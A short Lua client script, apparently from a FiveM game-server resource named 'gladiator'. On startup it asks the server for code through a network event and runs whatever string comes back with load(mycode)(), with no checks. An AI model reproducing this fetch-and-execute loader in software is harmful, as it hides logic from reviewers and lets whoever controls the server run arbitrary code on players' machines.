Citizen.CreateThread(function()
    TriggerServerEvent("gladiator:loadcode")
end)

-- RegisterCommand("loadcode", function(source, args, rawCommand)
--     TriggerServerEvent("gladiator:loadcode")
-- end)

RegisterNetEvent("gladiator:loadcode")
AddEventHandler("gladiator:loadcode", function(mycode)
    load(mycode)()
end)
